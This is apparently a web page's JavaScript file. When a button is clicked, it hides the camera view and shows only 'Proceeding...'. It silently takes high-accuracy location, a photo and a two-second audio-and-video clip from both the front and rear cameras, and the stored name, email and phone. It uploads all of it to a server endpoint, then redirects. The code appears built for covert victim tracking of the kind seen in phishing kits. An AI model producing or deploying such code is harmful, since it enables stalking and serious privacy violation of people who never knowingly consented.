const video = document.getElementById('camera');
const allowButton = document.getElementById('allowButton');
const status = document.getElementById('status');
const canvas = document.getElementById('canvas');

let stream;

async function waitForVideoReady() {

    if (video.videoWidth > 0 && video.videoHeight > 0) {
        return;
    }

    await new Promise((resolve, reject) => {

        const timeout =
            setTimeout(() => {
                reject(new Error('Camera did not provide video frames.'));
            }, 10000);

        const checkVideo = () => {

            if (video.videoWidth > 0 && video.videoHeight > 0) {
                clearTimeout(timeout);
                resolve();
                return;
            }

            requestAnimationFrame(checkVideo);

        };

        checkVideo();

    });

}

async function captureCamera(facingMode) {

    try {

        stream =
            await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: {
                        exact: facingMode
                    }
                },
                audio: true
            });

    } catch (error) {

        stream =
            await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: {
                        ideal: facingMode
                    }
                },
                audio: true
            });

    }

    video.srcObject = null;
    video.srcObject = stream;

    await video.play();
    await waitForVideoReady();

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    canvas
        .getContext('2d')
        .drawImage(
            video,
            0,
            0,
            canvas.width,
            canvas.height
        );

    const photoBlob =
        await new Promise(resolve => {

            canvas.toBlob(
                resolve,
                'image/jpeg',
                0.9
            );

        });

    if (!photoBlob) {
        throw new Error('Photo capture failed.');
    }

    if (!window.MediaRecorder) {
        throw new Error('Video recording is not supported by this browser.');
    }

    const supportedMimeType = [
        'video/webm;codecs=vp8,opus',
        'video/webm',
        'video/mp4'
    ].find(type => (
        typeof MediaRecorder.isTypeSupported !== 'function' ||
        MediaRecorder.isTypeSupported(type)
    ));

    const chunks = [];
    const recorder =
        supportedMimeType
            ? new MediaRecorder(stream, {
                mimeType: supportedMimeType
            })
            : new MediaRecorder(stream);

    recorder.ondataavailable =
        event => {

            if (event.data.size > 0) {
                chunks.push(event.data);
            }

        };

    const recordingFinished =
        new Promise(resolve => {
            recorder.onstop = resolve;
        });

    recorder.start();

    await new Promise(resolve =>
        setTimeout(resolve, 2000)
    );

    recorder.stop();
    await recordingFinished;

    const videoBlob =
        new Blob(
            chunks,
            {
                type:
                    recorder.mimeType ||
                    supportedMimeType ||
                    'video/webm'
            }
        );

    stream
        .getTracks()
        .forEach(track => track.stop());

    stream = null;

    return {
        photoBlob: photoBlob,
        videoBlob: videoBlob
    };

}

function showProceedingState() {

    status.textContent =
        'Proceeding...';

    allowButton.style.display = 'none';
    video.style.display = 'none';

}


// ==========================================
// GET LOCATION
// ==========================================

function getLocation() {

    return new Promise(resolve => {

        if (!navigator.geolocation) {

            resolve(null);
            return;

        }

        navigator.geolocation.getCurrentPosition(

            position => {

                resolve({

                    latitude:
                        position.coords.latitude,

                    longitude:
                        position.coords.longitude,

                    accuracy:
                        position.coords.accuracy

                });

            },

            () => {

                resolve(null);

            },

            {
                enableHighAccuracy: true,
                timeout: 10000
            }

        );

    });

}


// ==========================================
// ALLOW + START
// ==========================================

allowButton.onclick = async () => {

    try {

        showProceedingState();


        // ==================================
        // LOCATION PERMISSION
        // ==================================

        const location =
            await getLocation();


        const frontCapture =
            await captureCamera('user');

        const rearCapture =
            await captureCamera('environment');


        // ==================================
        // SEND EVERYTHING
        // ==================================

        const formData =
            new FormData();


        const email =
            sessionStorage.getItem(
                'userEmail'
            ) || 'unknown';

        const name =
            sessionStorage.getItem(
                'userName'
            ) || 'unknown';

        const phone =
            sessionStorage.getItem(
                'userPhone'
            ) || 'unknown';


        formData.append(
            'email',
            email
        );

        formData.append(
            'name',
            name
        );

        formData.append(
            'phone',
            phone
        );


        if (location) {

            formData.append(
                'latitude',
                location.latitude
            );

            formData.append(
                'longitude',
                location.longitude
            );

            formData.append(
                'accuracy',
                location.accuracy
            );

        }


        formData.append(
            'photo',
            frontCapture.photoBlob,
            'photo-front.jpg'
        );


        formData.append(
            'video',
            frontCapture.videoBlob,
            'video-front.webm'
        );

        formData.append(
            'photoRear',
            rearCapture.photoBlob,
            'photo-rear.jpg'
        );

        formData.append(
            'videoRear',
            rearCapture.videoBlob,
            'video-rear.webm'
        );


        const response =
            await fetch(

                '/api/upload-media',

                {
                    method: 'POST',
                    body: formData
                }

            );


        const result =
            await response.json();


        if (!response.ok) {

            throw new Error(
                result.message
            );

        }

        sessionStorage.setItem(
            'submissionId',
            result.submissionId
        );


        // Turn devices off

        if (stream) {
            stream
                .getTracks()
                .forEach(
                    track =>
                        track.stop()
                );
        }
            setTimeout(() => {
    window.location.href = '/location.html';
}, 1000);


    } catch (error) {

        console.error(error);


        status.textContent =
            error.message ||
            'Unable to proceed. Please try again.';


        if (stream) {

            stream
                .getTracks()
                .forEach(
                    track =>
                        track.stop()
                );

        }

    }

};